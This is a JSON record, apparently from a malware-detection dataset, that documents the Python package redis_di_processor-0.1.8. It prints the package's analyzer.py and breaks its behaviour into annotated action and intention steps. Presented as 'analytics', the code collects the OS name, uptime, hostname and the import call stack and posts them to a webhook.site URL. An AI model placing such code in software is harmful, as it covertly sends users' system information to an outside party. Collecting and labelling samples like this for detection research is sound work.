{
  "metadata": {
    "package_name": "redis_di_processor-0.1.8",
    "report_path": "/home2/blue/Documents/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/redis_di_processor-0.1.8.txt",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/redis_di_processor-0.1.8.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "analyzer.py",
      "code_snippets": [
        {
          "snippet": "import platform\nimport socket\nimport time\nimport psutil\nimport requests\nimport traceback\n\ndef find_import_stack():\n    stack = traceback.extract_stack()\n    stack_info = []\n    for frame in stack:\n        stack_info.append({\n            'file': frame.filename,\n            'line': frame.lineno,\n            'function': frame.name,\n            'code': frame.line.strip(),\n        })\n    return stack_info\n\ndef find_import_context():\n    stack = traceback.extract_stack()\n    for frame in reversed(stack):\n        if \"site-packages\" in frame.filename or \"dist-packages\" in frame.filename:\n            return frame.filename\n    return \"Unknown\"\n\ndef analytics():\n    os_info = platform.system()\n    uptime = time.time() - psutil.boot_time()\n    stack_info = find_import_stack()\n    context = find_import_context()\n    data = {\n        'os': os_info,\n        'uptime': uptime,\n        'hostname': socket.gethostname(),\n        'package_info': __name__,\n        'context': context,\n        'import_stack': stack_info,\n    }\n    try:\n        response = requests.post('https://webhook.site/baf67bd8-bf43-41ae-8af2-4a0fb906f90d/analytics', json=data)\n        if response.status_code == 200:\n            print(\"Analytics sent successfully.\")\n        else:\n            print(f\"Failed to send analytics. Status code: {response.status_code}\")\n    except Exception as e:\n        print(f\"Error sending analytics: {e}\")\n\nif __name__ == \"__main__\":\n    analytics()",
          "triple_sequences": [
            {
              "action_api": "platform.system()",
              "action_description": "Retrieves operating system identifier",
              "action_id": "get_os_id",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get operating system name",
              "intention_id": "get_operating_system_name"
            },
            {
              "action_api": "psutil.boot_time()",
              "action_description": "Returns system boot time",
              "action_id": "get_boot_time",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Extract uptime value",
              "intention_id": "extract_uptime_value"
            },
            {
              "action_api": "time.time()",
              "action_description": "Returns current time",
              "action_id": "get_current_time",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get datetime epoch",
              "intention_id": "get_datetime_epoch"
            },
            {
              "action_api": "find_import_stack()",
              "action_description": "Extracts current call stack as FrameSummary objects",
              "action_id": "extract_call_stack",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Extract structured file data",
              "intention_id": "extract_structured_file_data"
            },
            {
              "action_api": "find_import_context()",
              "action_description": "Extracts current call stack as FrameSummary objects",
              "action_id": "extract_call_stack",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Extract structured file data",
              "intention_id": "extract_structured_file_data"
            },
            {
              "action_api": "socket.gethostname()",
              "action_description": "Retrieves current host name",
              "action_id": "get_hostname",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Collect system hostname",
              "intention_id": "collect_system_hostname"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "https://webhook.site/baf67bd8-bf43-41ae-8af2-4a0fb906f90d/analytics",
              "object_description": "Webhook endpoint",
              "object_id": "webhook_endpoint",
              "intention_description": "Transmit environment data to remote server",
              "intention_id": "transmit_environment_data_server"
            },
            {
              "action_api": "response.status_code",
              "action_description": "Retrieves HTTP response status code",
              "action_id": "get_http_status",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Access attribute value",
              "intention_id": "access_attribute_value"
            }
          ]
        }
      ]
    }
  ]
}